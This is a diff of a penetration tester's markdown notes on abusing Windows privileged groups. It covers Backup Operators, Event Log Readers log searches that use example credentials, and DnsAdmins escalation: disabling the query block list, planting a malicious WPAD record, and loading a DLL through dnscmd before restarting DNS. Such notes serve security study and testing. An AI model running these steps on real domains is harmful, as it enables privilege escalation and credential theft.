@@ -1,9 +1,11 @@
 # Windows Groups
 
-For [[Active-Directory-Privileged-Groups]]
+For [[Active-Directory-Privileged-Groups]] as well as the official documnetation regarding Check [Active Directory default security groups by operating system version](https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-R2-and-2012/dn579255(v=ws.11)?redirectedfrom=MSDN#event-log-readers).
 
 ## Builtin Groups
 
+
+#### Backup Operators
 
 [Backup Operators](https://docs.microsoft.com/en-us/windows/security/identity-protection/access-control/active-directory-security-groups#bkmk-backupoperators) have the [[SeBackupPrivilege]] and SeRestorePrivilege privileges. Although the account must programmatically copy the data specifying the [FILE_FLAG_BACKUP_SEMANTICS](https://docs.microsoft.com/en-us/windows/win32/api/fileapi/nf-fileapi-createfilea) flag. 
 ```powershell
@@ -11,10 +13,73 @@ For [[Active-Directory-Privileged-Groups]]
 robocopy /B $SourcePath $DestinationPath
 ```
 
+#### Event Log Readers
 
-[Event Log Readers](https://docs.microsoft.com/en-us/windows/security/identity-protection/access-control/active-directory-security-groups#bkmk-eventlogreaders)
+[Event Log Readers](https://docs.microsoft.com/en-us/windows/security/identity-protection/access-control/active-directory-security-groups#bkmk-eventlogreaders) can read event logs from local computers. The group is created when the server is promoted to a domain controller - Check [Active Directory default security groups by operating system version](https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-R2-and-2012/dn579255(v=ws.11)?redirectedfrom=MSDN#event-log-readers)
+```powershell
+# Searching security logs 
+wevtutil qe Security /rd:true /f:text | Select-String "/user"
+# Passing credentials with  wevtutil
+wevtutil qe Security /rd:true /f:text /r:share01 /u:julie.clay /p:Welcome1 | findstr "/user"
+```
 
-[DnsAdmins](https://docs.microsoft.com/en-us/windows/security/identity-protection/access-control/active-directory-security-groups#bkmk-dnsadmins)
+[HTB academy](https://academy.hackthebox.com): *"Searching the `Security` event log with `Get-WinEvent` requires administrator access or permissions adjusted on the registry key `HKLM\System\CurrentControlSet\Services\Eventlog\Security`. Membership in just the `Event Log Readers` group is not sufficient."*
+```powershell
+Get-WinEvent -LogName security | where { $_.ID -eq 4688 -and $_.Properties[8].Value -like '*/user*'} | Select-Object @{name='CommandLine';expression={ $_.Properties[8].Value }}
+# To run as a specific user:
+# -Credential 
+```
+
+#### DNS Admins
+
+[DnsAdmins](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/manage/understand-security-groups#dnsadmins) group have access to network DNS information and DNS service. The DNS service runs as `NT AUTHORITY\SYSTEM` supporting custiom plugins specifiable with the builtit [dnscmd](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/dnscmd) utility. DnsAdmin do not have reboot permissions on DNS server by default. 
+
+
+1. Use [mimilibdll](https://github.com/gentilkiwi/mimikatz/tree/master/mimilib) authored by Benjamin Delphy by  modifying the [kdns.c](https://github.com/gentilkiwi/mimikatz/blob/master/mimilib/kdns.c) file to execute code - review [labofapenetrationtester article](http://www.labofapenetrationtester.com/2017/05/abusing-dnsadmins-privilege-for-escalation-in-active-directory.html)
+
+2. Create a WPAD Record - [[Responder-Cheatsheet]] or [[Inveigh-Cheatsheet]] to capture hashes as [DnsAdmins have permission to disable global query block security](https://docs.microsoft.com/en-us/powershell/module/dnsserver/set-dnsserverglobalqueryblocklist?view=windowsserver2019-ps)
+```powershell
+# Disable the global query block list
+Get-DnsServerGlobalQueryBlockList -Enable $false -ComputerName dc01.$domain.local
+# Create a malicious A record point to our machine
+Add-DnsServerResourceRecordA -Name wpad -ZoneName $domain.local -ComputerName dc01.$domain.local -IPv4Address $badIPv4address
+```
+
+3. User Dnscmd to load a plugin
+[adsecurity DNSAdmin to Domain Admin article](https://adsecurity.org/?p=4064) attack chain:
+- *DNS management is performed over RPC*
+- *[ServerLevelPluginDll](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-dnsp/c9d38538-8827-44e6-aa5e-022a016ed723) allows us to load a custom DLL with zero verification of the DLL's path. *This can be done with the `dnscmd` tool from the command line*
+- *When a member of the `DnsAdmins` group runs the `dnscmd` command below, the `HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\DNS\Parameters\ServerLevelPluginDll` registry key is populated*
+- *When the DNS service is restarted, the DLL in this path will be loaded (i.e., a network share that the Domain Controller's machine account can access)*
+- *An attacker can load a custom DLL to obtain a reverse shell or even load a tool such as Mimikatz as a DLL to dump credentials.*
+
+[[Creating-Malicious-DLLs]], Review [Security Descriptor Definition Lanaguage](https://learn.microsoft.com/en-us/windows/win32/secauthz/security-descriptor-definition-language) - [How to view and modify permissions in Windows](https://www.winhelponline.com/blog/view-edit-service-permissions-windows/)
+```powershell
+# Warning stop and starting a DNS server is destructive and bad opsec
+dnscmd.exe /config /serverlevelplugindll C:\Users\netadm\Desktop\adduser.dll
+# Get our SID
+wmic useraccount where name="$compromisedUserThatRanDnscmd" get sid
+# Check permissions on DNS service - beware SDDL - requires .exe 
+sc.exe sdshow DNS
+# Stop and start DNS to load the plugin
+sc.exe stop dns
+sc.exe start dns
+sc.exe query dns
+#
+# Cleanup
+#
+# Confirm registry key added
+reg query \\$IPaddress\HKLM\SYSTEM\CurrentControlSet\Services\DNS\Parameters
+# Delete registry key
+reg delete \\$IPaddress\HKLM\SYSTEM\CurrentControlSet\Services\DNS\Parameters /v ServerLevelPluginDll
+```
+
+
+
+
+
+
+#### Hyper-V Administrators
 
 [Hyper-V Administrators](https://docs.microsoft.com/en-us/windows/security/identity-protection/access-control/active-directory-security-groups#bkmk-hypervadministrators)
 
@@ -722,3 +787,17 @@ How-to: [Understand the different types of Active Directory group](https://ss64.
 [Hyper-V Administrators](https://docs.microsoft.com/en-us/windows/security/identity-protection/access-control/active-directory-security-groups#bkmk-hypervadministrators)
 [Print Operators](https://docs.microsoft.com/en-us/windows/security/identity-protection/access-control/active-directory-security-groups#bkmk-printoperators)
 [Server Operators](https://docs.microsoft.com/en-us/windows/security/identity-protection/access-control/active-directory-security-groups#bkmk-serveroperators)
+[HTB academy](https://academy.hackthebox.com)
+[Understand the different types of Active Directory group](https://ss64.com/nt/syntax-groups.html)
+[Q271876](https://web.archive.org/web/20120327173217/https://support.microsoft.com/kb/271876) 
+[Q243330](https://support.microsoft.com/en-us/help/243330/) 
+[Q277752](https://web.archive.org/web/20090221162529/https://support.microsoft.com/kb/277752) 
+[AdminSdHolder FAQ](https://docs.microsoft.com/en-gb/archive/blogs/askds/five-common-questions-about-adminsdholder-and-sdprop) 
+[protected](https://specopssoft.com/blog/troubleshooting-user-account-permissions-adminsdholder/) 
+[Active Directory Security Groups](https://docs.microsoft.com/en-us/windows/security/identity-protection/access-control/active-directory-security-groups)
+[ss64 Security Groups Table](https://ss64.com/nt/syntax-security_groups.html)
+[dnscmd](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/dnscmd)
+[adsecurity DNSAdmin to Domain Admin article](https://adsecurity.org/?p=4064) 
+[Security Descriptor Definition Lanaguage](https://learn.microsoft.com/en-us/windows/win32/secauthz/security-descriptor-definition-language) 
+[How to view and modify permissions in Windows](https://www.winhelponline.com/blog/view-edit-service-permissions-windows/)
+[disable global query block security](https://docs.microsoft.com/en-us/powershell/module/dnsserver/set-dnsserverglobalqueryblocklist?view=windowsserver2019-ps)
